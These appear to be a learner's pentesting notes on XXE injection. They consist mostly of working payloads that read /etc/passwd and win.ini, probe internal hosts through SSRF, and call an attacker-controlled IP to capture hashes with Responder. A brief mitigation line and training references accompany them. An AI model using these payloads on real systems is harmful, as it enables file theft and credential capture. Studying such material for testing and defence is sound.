# XXE Injection

XML External Entity injection (XXE) - [OWASP](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) *"is a type of attack against an application that parses XML input. This attack occurs when **XML input containing a reference to an external entity is processed by a weakly configured XML parser**. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts."*

## XXE to retrieve files

Portswigger example of stock level in  shopping application:
`<?xml version="1.0" encoding="UTF-8"?> <stockCheck><productId>381</productId></stockCheck>`

`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>`

## XXE to SSRF attacks

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`

3. Blind XXE to exfiltrate data out-of-band
4. Blind XXE to retrieve data via error messages

## XXE XML Entity injection

See [[XML]] for more about XML
```xml
<!--Last Line of Request -->

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)> <!-- REF: (#ANY) instead of (ANY) -->
<!ENTITY file SYSTEM "file:///etc/passwd">
]> 
<xmlEntityInjection>
	<Author>Hacker1</Author> 
	<Subject>&file;</Subject>
	<Content>LearnDaXMLs3</Content>
</xmlEntityInjection>

<!--Notes -->
<!-- Creates a Header-->
<!-- System call to file variable->
<!-- Prints address file with &file -->
<!-- The two section must connect -->
```
[PayloadsAllTheThings - XXE ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/Classic%20XXE%20-%20etc%20passwd.xml)

To examplify, simplify the above and enumerate the OS with Arbituary File Read
```xml
<!-- Either:  -->
<!-- SYSTEM "/etc/passwd"  -->
<!-- SYSTEM "file:///etc/passwd"  -->

<!--Windows  -->

<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<!--Entity is injected somewhere   -->
<placetoinject>
	&test;
</placetoinject>

<!--Linux  -->

<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<!--Entity is injected somewhere   -->
<placetoinject>
	&test;
</placetoinject>
```

XXE abuse [[Server-Side-Request-Forgery]] - and capture hashes with [[Responder-Cheatsheet]]
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://$yourIP$/test"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
The above is modified from HackTricks - [check Hacktricks for Blind SSRF, DTD abuse and others](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

## Mediation

Configuration of a XML interperter disallowing the inclusion of external entities enabling attack against applications that interpret XML language in their parameters. 



## References

[THM Walkthrough Room on XXE CVE-2021-29447](https://tryhackme.com/room/wordpresscve202129447)
[Portswigger](https://portswigger.net/web-security/xxe)
[BrightSec](https://brightsec.com/blog/xxe-attack/)
[OWASP](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
[PayloadsAllTheThings - XXE ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/Classic%20XXE%20-%20etc%20passwd.xml)
[Hacktricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
